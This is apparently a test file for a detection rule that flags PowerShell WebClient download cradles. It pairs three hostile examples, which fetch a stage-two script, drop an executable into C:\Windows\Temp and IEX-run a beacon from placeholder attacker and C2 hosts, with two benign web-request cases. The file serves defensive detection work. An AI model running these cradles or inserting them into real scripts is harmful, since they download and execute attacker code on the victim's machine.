# ruleid: ps-download-cradle-webclient
$payload = (New-Object Net.WebClient).DownloadString('http://attacker.example.com/stage2.ps1')

# ruleid: ps-download-cradle-webclient
(New-Object System.Net.WebClient).DownloadFile('http://evil.example.com/tool.exe', 'C:\Windows\Temp\tool.exe')

# ruleid: ps-download-cradle-webclient
IEX (New-Object System.Net.WebClient).DownloadString('https://c2.example.com/beacon.ps1')

# ok: ps-download-cradle-webclient
$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent", "MyScript/1.0")
$data = $wc.UploadString("https://api.example.com/log", $logData)

# ok: ps-download-cradle-webclient
Invoke-WebRequest -Uri 'https://example.com/api' -Method Get | Select-Object StatusCode
